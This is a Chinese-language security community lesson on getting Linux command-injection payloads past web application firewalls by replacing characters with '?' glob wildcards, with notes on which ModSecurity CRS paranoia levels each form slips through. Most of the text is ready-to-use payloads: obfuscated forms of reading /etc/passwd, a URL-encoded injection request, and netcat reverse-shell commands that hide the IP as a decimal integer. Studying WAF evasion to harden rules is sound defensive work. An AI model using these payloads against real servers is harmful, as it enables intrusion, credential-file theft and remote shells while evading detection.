# 案例课：Linux glob `?` 绕 WAF 拦 RCE（theMiddle 2017）

> SecAtlas `cmd-waf-bypass` 原先 glob 例子是错的（`/???/???` 配不上 `cat`）。hack-skills 只写「RCE: wildcard abuse」没有 payload。本课补可打形态。

## 为什么用 `?` 不用 `*`

`*` 在 SQL 里当注释（`/*`），很多 WAF 为防 SQLi 直接拦。问号只匹配**一个**字符。

## 可打 payload（字符集：`/` `?` 字母数字 空格）

| 目的 | 标准 | glob |
|---|---|---|
| cat passwd | `/bin/cat /etc/passwd` | `/???/??t /???/??ss??` |
| 更少 `?`（躲 PL3 重复元字符） | 同上 | `/?in/cat+/et?/passw?` |
| ls | `/bin/ls` | `/???/?s` |
| nc 反弹 | `nc -e /bin/bash 127.0.0.1 1337` | `/???/n? -e /???/b??h 2130706433 1337` |
| nc.traditional | | `/???/?c.??????????? -e /???/b??h 2130706433 1337` |

`2130706433` = `127.0.0.1` 长整型，HTTP 里避开 `.`。

URL 编码示例（WAF 拦明文 `/etc/passwd` `/bin/ls` 时）：

```
/?cmd=%2f???%2f??t%20%2f???%2fp??s??
```

`echo /*/*ss*` 可枚举文件；有注入点但命令名被拦时先 glob 探路径。

## CRS Paranoia Level（本地原先没有）

| PL | `?` `/` 空格 | 结果 |
|---|---|---|
| 0 | 大量规则关 | 明文 RCE 也过（正常） |
| 1–2 | 规则 920271/920272 接受这些字符；OS Files 过滤器认路径不认 glob | `/???/??t /???/??ss??` 过 |
| 3 | 拦「重复非单词字符」（一串 `?`） | 减到 3 个 `?`：`/?in/cat+/et?/passw?` |
| 4 | 基本只放 A-Za-z0-9 | 没空格没斜杠，**这条死** |

Sucuri 实测：明文 `cat /etc/passwd` → 「RFI/LFI blocked」；换成问号 glob → 放行。

测的是故意 `system($_GET['c'])` 的规则盲区，**不是给真站评级**。按功能域分别配 CRS，不要整站同一 PL。

SecAtlas 卡已改成上表 payload：`/root/SecAtlas/techniques/cmd-injection/waf-bypass.yaml`。

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
